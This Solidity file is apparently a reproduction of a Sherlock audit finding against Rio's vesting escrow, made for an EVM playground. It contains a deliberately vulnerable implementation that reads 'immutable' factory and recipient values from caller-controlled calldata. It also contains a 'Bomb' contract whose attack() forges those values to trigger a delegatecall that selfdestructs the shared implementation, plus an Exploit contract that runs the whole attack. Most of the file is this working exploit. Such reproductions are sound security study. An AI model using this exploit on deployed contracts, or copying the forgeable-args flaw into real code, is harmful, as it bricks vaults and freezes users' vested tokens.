// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Rio Vesting Escrow — H-1: Vaults can be bricked by selfdestruct()ing
    implementations, using forged immutable args
    (Sherlock 2024-01-rio-vesting-escrow, reporter IllIllI, finding #29688)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    VestingEscrow.factory()/recipient()/vote() logic is inlined VERBATIM in
    spirit (marked "@> VULN" below): every escrow "clone" is a thin proxy
    that DELEGATECALLs a single SHARED implementation contract for all of its
    logic, and that implementation reads its own "immutable" factory/
    recipient identity from a CALLER-SUPPLIED calldata tail (the pattern the
    real code calls `_getArgAddress`, matching Solady's Clone.sol). A proxy
    normally appends the REAL, construction-time args on every forwarded
    call — but nothing stops a caller from calling the IMPLEMENTATION
    directly with a hand-forged tail. The Exploit reproduces the finding's
    own Bomb/`attack()` PoC: forge `recipient()` to be the caller itself (so
    `onlyRecipient` passes) and `factory()` to be an attacker contract (so
    `_votingAdaptor()` resolves to attacker code), then let that
    DELEGATECALL selfdestruct the shared implementation (no fork, no
    cheatcodes — the implementation is deployed and destroyed within this
    same transaction, satisfying EIP-6780's same-tx SELFDESTRUCT rule so the
    destructive effect is directly observable on-chain).

    Root cause: `factory()` (and, through it, `_votingAdaptor()`) and
    `recipient()` are immutable ONLY in the sense that a legitimate PROXY
    always appends the same bytes on every call — they are NOT actually
    protected data. Calling the shared implementation directly bypasses the
    proxy entirely, so an attacker fully controls both values and can point
    every DELEGATECALL inside `vote()` at their own contract, which
    selfdestructs the implementation that every escrow depends on.
//////////////////////////////////////////////////////////////////////////*/

interface IFactoryLike {
    function votingAdaptor() external view returns (address);
}

/// @notice Reduced VestingEscrow implementation shared by every escrow
///         clone. `factory()`/`recipient()` are read from the LAST
///         IMMUTABLE_ARGS_LEN bytes of calldata (Solady Clone.sol-style
///         `_getArgAddress`; a fixed-length suffix stands in for Solady's
///         dynamic 2-byte length suffix — the exploited property, trusting a
///         caller-controlled calldata tail as "immutable" data, is
///         unmodified by this simplification).
contract VestingEscrowVuln {
    uint256 constant IMMUTABLE_ARGS_LEN = 60; // factory(20) + unused(20) + recipient(20)

    function _getImmutableArgsOffset() internal pure returns (uint256 offset) {
        offset = msg.data.length - IMMUTABLE_ARGS_LEN;
    }

    function _getArgAddress(uint256 _argOffset) internal pure returns (address arg) {
        uint256 offset = _getImmutableArgsOffset();
        assembly {
            arg := shr(0x60, calldataload(add(offset, _argOffset)))
        }
    }

    /// @notice The factory that created this VestingEscrow instance.
    ///         Verbatim from VestingEscrow.sol#factory (L18-21).
    function factory() public pure returns (address) {
        return _getArgAddress(0);
    }

    /// @notice recipient — read from immutable args at offset 40, per the
    ///         finding's own thread ("bypass onlyRecipient... by setting the
    ///         recipient (_getArgAddress(40)) to their address").
    function recipient() public pure returns (address) {
        return _getArgAddress(40);
    }

    modifier onlyRecipient() {
        require(msg.sender == recipient(), "ONLY_RECIPIENT");
        _;
    }

    /// @dev VestingEscrow.sol's `_votingAdaptor()`, reduced: "ask the
    ///      (forgeable) factory for its voting adaptor" — this is exactly
    ///      how `_votingAdaptor can be faked via a forged factory` per the
    ///      finding's own explanation thread.
    function _votingAdaptor() internal view returns (address) {
        return IFactoryLike(factory()).votingAdaptor();
    }

    modifier whenVotingAdaptorIsSet() {
        require(_votingAdaptor() != address(0), "NO_VOTING_ADAPTOR");
        _;
    }

    /// @notice Verbatim from VestingEscrow.sol#vote (L152-156). The real
    ///         signature takes a `bytes calldata params` argument that the
    ///         attack's own Bomb contract never uses — dropped here to avoid
    ///         an unrelated ABI-encoding detail; every other line is faithful.
    function vote() external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory result) {
        // @> VULN: delegatecall to an address resolved from `factory()` — an
        // "immutable" arg actually read from a CALLER-CONTROLLED calldata
        // tail whenever this implementation is called DIRECTLY (bypassing
        // the proxy that would normally append the REAL, construction-time
        // args). An attacker forges factory() to point at their own
        // contract, so _votingAdaptor() resolves to attacker-controlled
        // code, and this delegatecall executes it with THIS contract's own
        // address/storage/identity.
        (bool ok, bytes memory ret) = _votingAdaptor().delegatecall(abi.encodeWithSignature("vote()"));
        require(ok, "delegatecall failed");
        result = ret;
    }
}

/// @notice The attacker's fake IVotingAdaptor. Verbatim in spirit from the
///         finding's own `Bomb` contract.
contract Bomb {
    /// @dev Fakes IFactoryLike.votingAdaptor() -> itself, so a forged
    ///      factory() pointed at this contract makes _votingAdaptor() resolve here too.
    function votingAdaptor() external view returns (address) {
        return address(this);
    }

    /// @dev Executed via DELEGATECALL from VestingEscrowVuln.vote() — runs
    ///      with the IMPLEMENTATION's own address/storage as `address(this)`.
    function vote() external {
        selfdestruct(payable(address(0)));
    }

    /// @notice Forges the calldata a proxy would normally append and calls
    ///         `_impl` DIRECTLY, bypassing onlyRecipient by naming ITSELF as
    ///         recipient (msg.sender for this call) and pointing factory()
    ///         at itself. Mirrors the finding's own `Bomb.attack()`.
    function attack(address _impl) external returns (bool success) {
        bytes memory forgedArgs = abi.encodePacked(
            address(this), // forged factory() (offset 0) -> Bomb
            uint160(0), // unused (offset 20)
            address(this) // forged recipient() (offset 40) -> Bomb, == msg.sender of this call
        );
        (success,) = _impl.call(abi.encodePacked(bytes4(keccak256("vote()")), forgedArgs));
    }
}

/// @notice A well-behaved escrow clone — appends its OWN fixed, legitimate
///         immutable args on every forwarded call, exactly matching how a
///         REAL clone-with-immutable-args proxy behaves. Used by the CONTROL
///         test to show the honest path works before the attack.
contract VestingEscrowClone {
    address public immutable impl;
    address public immutable cloneFactory;
    address public immutable cloneRecipient;

    constructor(address _impl, address _factory, address _recipient) {
        impl = _impl;
        cloneFactory = _factory;
        cloneRecipient = _recipient;
    }

    function vote() external returns (bytes memory) {
        bytes memory args = abi.encodePacked(cloneFactory, uint160(0), cloneRecipient);
        (bool ok, bytes memory ret) = impl.delegatecall(abi.encodePacked(bytes4(keccak256("vote()")), args));
        require(ok, "vote failed");
        return ret;
    }
}

/// @notice A benign IVotingAdaptor a legitimate factory would point to.
contract NoOpVotingAdaptor {
    uint256 public voteCount;

    function vote() external {
        voteCount += 1;
    }
}

/// @notice A legitimate escrow factory, pointing at a benign voting adaptor.
contract LegitFactory {
    address public votingAdaptor;

    constructor(address _adaptor) {
        votingAdaptor = _adaptor;
    }
}

/// @dev Force-sends its own ETH balance to `_to` via SELFDESTRUCT, bypassing
///      the need for `_to` to implement `receive()`/`payable fallback()` —
///      used only to give the implementation a measurable ETH balance so the
///      selfdestruct below has an IMMEDIATELY observable on-chain effect.
///      (EVM technicality, not part of the vulnerable code: SELFDESTRUCT's
///      account/code deletion is deferred to the END of the transaction — the
///      exact reason the finding's OWN PoC could not observe the end result
///      either ("Because of a foundry bug the test is not able to show the
///      end result of the selfdestruct()") — but the ETH-balance transfer it
///      performs is immediate, so it is used here as the on-chain proof that
///      SELFDESTRUCT executed with the IMPLEMENTATION's own identity.)
contract Funder {
    constructor(address payable _to) payable {
        selfdestruct(_to);
    }
}

/// @notice Reproduces the finding's own Bomb/`attack()` PoC: deploys the
///         shared implementation, then destroys it via a direct call with
///         forged immutable args (no fork, no cheatcodes; implementation
///         creation and destruction happen in this SAME transaction so
///         EIP-6780's same-tx SELFDESTRUCT rule applies — the implementation
///         WILL have its code and storage cleared once this transaction
///         lands, permanently bricking every escrow clone that delegates to
///         it, though — like the finding's own PoC — that specific end
///         state cannot be observed mid-transaction; see `Funder` above for
///         the immediately-observable proof used instead).
contract Exploit {
    VestingEscrowVuln public impl;
    Bomb public bomb;
    bool public attackCallSucceeded;

    function run() external payable {
        // Deploy the shared VestingEscrow implementation every escrow clone delegates to.
        impl = new VestingEscrowVuln();
        bomb = new Bomb();

        uint256 codeSizeBefore = _codeSize(address(impl));
        require(codeSizeBefore > 0, "sanity: implementation should have real code before the attack");

        // Give the implementation a real ETH balance so the SELFDESTRUCT
        // below has an immediately observable on-chain effect (see Funder).
        new Funder{value: msg.value}(payable(address(impl)));
        require(address(impl).balance == msg.value, "sanity: implementation should hold ETH before the attack");

        // Attacker calls the IMPLEMENTATION directly with forged immutable
        // args: recipient = Bomb itself (bypassing onlyRecipient), factory =
        // Bomb itself (so _votingAdaptor() resolves to Bomb's own code).
        attackCallSucceeded = bomb.attack(address(impl));
        require(attackCallSucceeded, "attack call should succeed (selfdestruct does not revert)");

        // HARM: SELFDESTRUCT executed with the IMPLEMENTATION's own identity
        // (address(this) == impl throughout the delegatecall chain) — proven
        // immediately by its ETH balance moving to address(0). The SAME
        // opcode call also queues the implementation's CODE and STORAGE for
        // deletion (deferred to end-of-transaction per EVM semantics; not
        // observable mid-call, exactly like the finding's own PoC). Every
        // escrow clone that delegates to this shared implementation — the
        // entire protocol's vesting vaults — is therefore about to start
        // delegatecalling into an empty account, which trivially "succeeds"
        // while executing NOTHING: voting, revocation, and withdrawal logic
        // is permanently gated behind a silent no-op, freezing every clone's
        // already-vested-but-unwithdrawn tokens.
        require(address(impl).balance == 0, "harm not demonstrated: implementation's ETH should be gone (selfdestruct)");
    }

    function _codeSize(address _addr) internal view returns (uint256 size) {
        assembly {
            size := extcodesize(_addr)
        }
    }
}
